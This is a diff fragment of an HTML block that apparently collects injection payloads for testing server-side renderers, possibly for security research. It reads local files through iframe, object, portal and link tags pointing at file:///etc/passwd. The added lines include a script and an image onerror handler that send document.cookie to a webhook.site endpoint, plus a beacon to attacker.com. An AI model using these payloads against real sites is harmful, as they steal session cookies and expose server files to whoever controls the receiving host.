@@ -89,9 +89,19 @@
             <img src="https://127.0.0.1/index.php">
 			<iframe src=file:///etc/passwd></iframe>
 
-			<link rel=attachment href="file:///root/secret.txt">
+			<link rel=attachment href="file:///etc/passwd">
 			<object data="file:///etc/passwd">
 			<portal src="file:///etc/passwd" id=portal>
+			<!-- Basic discovery, Write somthing-->
+			<img src="x" onerror="document.write('test')" />
+			<script>document.write(JSON.stringify(window.location))</script>
+			<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
+			
+			<!--Basic blind discovery, load a resource-->
+			<img src="http://attacker.com"/>
+			<img src=x onerror="location.href='https://webhook.site/282e9927-ad71-4ae4-843a-6937ccf01f71/?c='+ document.cookie">
+			<script>new Image().src="https://webhook.site/282e9927-ad71-4ae4-843a-6937ccf01f71/?c="+encodeURI(document.cookie);</script>
+			<link rel=attachment href="https://webhook.site/282e9927-ad71-4ae4-843a-6937ccf01f71">
             </div>
           </div>
         </div>
